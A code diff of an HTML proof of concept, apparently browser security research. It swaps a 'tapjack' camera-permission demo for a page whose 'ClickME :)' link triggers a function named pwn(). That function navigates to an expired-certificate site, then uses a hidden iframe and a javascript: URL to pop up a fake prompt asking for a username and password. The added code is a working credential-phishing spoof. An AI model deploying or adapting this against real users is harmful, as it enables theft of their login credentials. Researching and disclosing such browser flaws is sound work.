@@ -1,40 +1,14 @@
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS Tapjack</title>
-    <style>
-        .red-button {
-            position: relative;
-            top: 45vh;
-            left: 45vw;
-            background-color: rgb(79, 235, 89);
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-        }
-    </style>
+<html>
+  <body>
     <script>
-        function requestCamera() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        alert('Camera access granted');
-                        // You can now use the stream for video capture
-                    })
-                    .catch((error) => {
-                        alert('Error accessing camera: ' + error.message);
-                    });
-            } else {
-                alert('Camera access is not supported by this browser.');
-            }
-        }
+    function pwn() {
+        win = window.open('https://expired.badssl.com', '_self')
+        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
+    }
     </script>
-</head>
-<body>
-    <button class="red-button" onclick="requestCamera()">Double tap</button>
-</body>
+
+    <iframe style="display:none" id="nop" src=""></iframe>
+
+    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
+  </body>
+</html>
